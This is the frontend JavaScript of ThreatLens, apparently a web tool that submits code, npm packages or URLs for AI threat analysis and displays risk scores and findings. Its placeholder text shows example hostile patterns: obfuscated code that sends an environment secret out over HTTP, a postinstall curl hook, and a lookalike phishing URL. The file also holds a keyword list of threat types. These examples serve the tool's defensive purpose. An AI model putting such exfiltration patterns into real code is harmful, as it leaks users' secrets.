// ============================================
// ThreatLens — Frontend Logic
// ============================================

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => document.querySelectorAll(sel);

// --- State ---
let currentType = 'code';

// --- Tab configuration ---
const TAB_CONFIG = {
    code: {
        label: 'Paste suspicious source code below',
        placeholder: 'Paste your code snippet here...\n\n// Example:\nconst _0x1234 = ["\\x68\\x74\\x74\\x70"];\nhttps.get(_0x1234[0] + "?data=" + process.env.SECRET);',
    },
    package: {
        label: 'Enter an npm package name or paste package.json content',
        placeholder: 'Enter a package name (e.g., colors-lib-v2)\n\nOr paste full package.json content:\n{\n  "name": "suspicious-pkg",\n  "scripts": { "postinstall": "curl ..." }\n}',
    },
    url: {
        label: 'Enter a suspicious URL to analyze',
        placeholder: 'https://g00gle-login.tk/verify?user=admin\n\nSupports: URLs, shortened links, suspicious domains',
    },
};

// --- DOM Elements ---
const tabs = $$('.tab');
const inputArea = $('#analysis-input');
const inputLabel = $('#input-label');
const charCount = $('#char-count');
const btnAnalyze = $('#btn-analyze');
const loadingState = $('#loading-state');
const loadingSub = $('#loading-sub');
const errorState = $('#error-state');
const errorMessage = $('#error-message');
const btnRetry = $('#btn-retry');
const results = $('#results');
const gaugeFill = $('#gauge-fill');
const gaugeValue = $('#gauge-value');
const riskBadge = $('#risk-badge');
const summaryText = $('#summary-text');
const findingsList = $('#findings-list');

// --- Tab Switching ---
tabs.forEach((tab) => {
    tab.addEventListener('click', () => {
        const type = tab.dataset.type;
        if (type === currentType) return;

        currentType = type;
        tabs.forEach((t) => {
            t.classList.toggle('active', t === tab);
            t.setAttribute('aria-selected', t === tab ? 'true' : 'false');
        });

        const config = TAB_CONFIG[type];
        inputLabel.textContent = config.label;
        inputArea.placeholder = config.placeholder;
        inputArea.value = '';
        updateCharCount();
        hideAllStates();
    });
});

// --- Character Count ---
inputArea.addEventListener('input', updateCharCount);

function updateCharCount() {
    const len = inputArea.value.length;
    charCount.textContent = `${len.toLocaleString()} characters`;
}

// --- State Management ---
function hideAllStates() {
    loadingState.classList.add('hidden');
    errorState.classList.add('hidden');
    results.classList.add('hidden');
}

function showLoading() {
    hideAllStates();
    loadingState.classList.remove('hidden');
    btnAnalyze.disabled = true;

    // Animate loading messages
    const messages = [
        'Pre-processing input data',
        'Analyzing threat patterns',
        'Running AI security scan',
        'Evaluating risk indicators',
        'Generating threat report',
    ];
    let i = 0;
    loadingSub.textContent = messages[0];
    const interval = setInterval(() => {
        i = (i + 1) % messages.length;
        loadingSub.textContent = messages[i];
    }, 2500);
    return interval;
}

function showError(message) {
    hideAllStates();
    errorState.classList.remove('hidden');
    errorMessage.textContent = message;
    btnAnalyze.disabled = false;
}

function showResults(data) {
    hideAllStates();
    results.classList.remove('hidden');
    btnAnalyze.disabled = false;

    // Animate risk gauge
    const score = data.risk_score || 0;
    const level = (data.risk_level || 'Low').toLowerCase();
    animateGauge(score, level);

    // Risk badge
    riskBadge.textContent = data.risk_level || 'Unknown';
    riskBadge.className = `risk-badge ${level}`;

    // Summary
    summaryText.textContent = data.summary || 'No summary available.';

    // Findings
    renderFindings(data.key_findings || []);
}

// --- Risk Gauge Animation ---
function animateGauge(targetScore, level) {
    const maxDash = 251.2; // arc length
    const targetOffset = maxDash - (maxDash * targetScore) / 100;

    // Set glow color based on level
    const container = $('.risk-gauge-container');
    const glowColors = {
        low: 'rgba(52, 211, 153, 0.08)',
        medium: 'rgba(251, 191, 36, 0.08)',
        high: 'rgba(239, 68, 68, 0.08)',
        critical: 'rgba(244, 63, 94, 0.12)',
    };
    container.style.setProperty('--gauge-glow', glowColors[level] || glowColors.low);

    // Animate counter
    let current = 0;
    const duration = 1200;
    const start = performance.now();

    function tick(now) {
        const elapsed = now - start;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3); // ease out cubic

        current = Math.round(eased * targetScore);
        gaugeValue.textContent = current;
        gaugeFill.setAttribute('stroke-dashoffset', maxDash - (maxDash * eased * targetScore) / 100);

        if (progress < 1) {
            requestAnimationFrame(tick);
        }
    }

    requestAnimationFrame(tick);
}

// --- Render Findings ---
function renderFindings(findings) {
    if (findings.length === 0) {
        findingsList.innerHTML = `
      <div class="no-findings">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
          <polyline points="22 4 12 14.01 9 11.01"/>
        </svg>
        <p>No security threats detected</p>
      </div>
    `;
        return;
    }

    const dangerTypes = ['data exfiltration', 'remote execution', 'backdoor', 'destructive', 'ransomware', 'malware', 'critical'];
    const warningTypes = ['obfuscation', 'suspicious', 'typosquatting', 'homograph', 'redirect'];

    findingsList.innerHTML = findings
        .map((f, i) => {
            const typeLower = (f.type || '').toLowerCase();
            let typeClass = '';
            if (dangerTypes.some((d) => typeLower.includes(d))) typeClass = 'danger';
            else if (warningTypes.some((w) => typeLower.includes(w))) typeClass = 'warning';

            const lines = (f.relevant_lines || [])
                .map((l) => `<div class="finding-line">${escapeHtml(l)}</div>`)
                .join('');

            return `
        <div class="finding-card" style="animation-delay: ${i * 0.1}s">
          <div class="finding-type ${typeClass}">${escapeHtml(f.type || 'Finding')}</div>
          <div class="finding-description">${escapeHtml(f.description || '')}</div>
          ${lines ? `<div class="finding-lines">${lines}</div>` : ''}
        </div>
      `;
        })
        .join('');
}

function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// --- API Call ---
async function analyze() {
    const content = inputArea.value.trim();
    if (!content) {
        showError('Please enter some content to analyze.');
        return;
    }

    const loadingInterval = showLoading();

    try {
        const res = await fetch('/api/analyze', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: currentType, content }),
        });

        clearInterval(loadingInterval);

        const data = await res.json();

        if (!res.ok || data.error) {
            showError(data.message || `Server returned HTTP ${res.status}`);
            return;
        }

        showResults(data.result);
    } catch (err) {
        clearInterval(loadingInterval);
        showError(`Network error: ${err.message}. Is the backend server running?`);
    }
}

// --- Event Listeners ---
btnAnalyze.addEventListener('click', analyze);
btnRetry.addEventListener('click', () => {
    hideAllStates();
    inputArea.focus();
});

// Ctrl+Enter to analyze
inputArea.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        e.preventDefault();
        analyze();
    }
});

// Initialize
updateCharCount();
